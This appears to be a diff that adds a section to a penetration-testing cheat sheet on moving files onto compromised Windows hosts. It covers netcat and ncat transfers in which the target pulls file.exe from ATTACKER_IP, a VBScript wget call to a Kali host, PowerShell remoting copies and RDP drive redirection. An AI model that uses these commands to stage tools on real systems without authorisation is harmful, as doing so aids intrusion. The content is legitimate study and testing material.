@@ -338,3 +338,120 @@ end with
 ```cmd
 cscript.exe /nologo wget.vbs http://<KALI-IP>:8000/<FILE> C:\Users\Public\<FILE>
 ```
+
+# Miscellaneous File Transfer Methods
+
+## Netcat / Ncat
+
+### Target listens → Attacker sends
+
+```cmd
+:: Target
+nc -l -p 8000 > file.exe
+```
+
+```bash
+# Attacker
+nc -q 0 TARGET_IP 8000 < file.exe
+```
+
+### Attacker listens → Target connects
+
+```bash
+# Attacker
+sudo nc -l -p 443 -q 0 < file.exe
+```
+
+```cmd
+:: Target
+nc ATTACKER_IP 443 > file.exe
+```
+
+### Ncat
+
+```bash
+# Attacker
+sudo ncat -l -p 443 --send-only < file.exe
+```
+
+```cmd
+:: Target
+ncat ATTACKER_IP 443 --recv-only > file.exe
+```
+
+---
+
+## PowerShell Remoting / WinRM
+
+### Check WinRM
+
+```powershell
+Test-NetConnection -ComputerName TARGET -Port 5985
+```
+
+### Create session
+
+```powershell
+$Session = New-PSSession -ComputerName TARGET
+```
+
+### Local → Remote
+
+```powershell
+Copy-Item -Path C:\file.exe -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+```
+
+### Remote → Local
+
+```powershell
+Copy-Item -Path C:\Users\Administrator\Desktop\file.exe -FromSession $Session -Destination C:\
+```
+
+### WinRM ports
+
+```text
+5985/tcp = HTTP
+5986/tcp = HTTPS
+```
+
+---
+
+## RDP File Transfer
+
+### Linux → Windows RDP with rdesktop
+
+```bash
+rdesktop TARGET_IP -d DOMAIN -u USER -p 'PASSWORD' \
+-r disk:linux='/home/user/share'
+```
+
+### Linux → Windows RDP with xfreerdp
+
+```bash
+xfreerdp /v:TARGET_IP /d:DOMAIN /u:USER /p:'PASSWORD' \
+/drive:linux,/home/user/share
+```
+
+### Access redirected drive inside RDP session
+
+```text
+\\tsclient\linux
+```
+
+### Native Windows RDP client
+
+```cmd
+mstsc
+```
+
+```text
+Local Resources
+→ More...
+→ Drives
+```
+
+Then access:
+
+```text
+\\tsclient\
+```
